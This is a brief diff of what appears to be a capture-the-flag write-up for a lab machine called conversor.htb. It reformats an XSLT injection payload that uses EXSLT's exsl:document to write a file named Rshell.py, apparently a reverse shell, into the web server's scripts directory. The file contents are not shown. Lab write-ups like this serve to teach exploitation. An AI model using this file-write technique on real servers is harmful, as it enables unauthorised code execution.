@@ -235,8 +235,7 @@ This version of EXSLT supports 2 seperate namespaces of exporting text to an upl
 
 ```
 <?xml version="1.0" encoding="UTF-8"?>
-<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" 
-xmlns:exsl="http://exslt.org/common" extension-element-prefixes="exsl">
+<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:exsl="http://exslt.org/common" extension-element-prefixes="exsl">
   <xsl:template match="/">
     <exsl:document href="/var/www/conversor.htb/scripts/Rshell.py" method="text">
         <xsl:text>
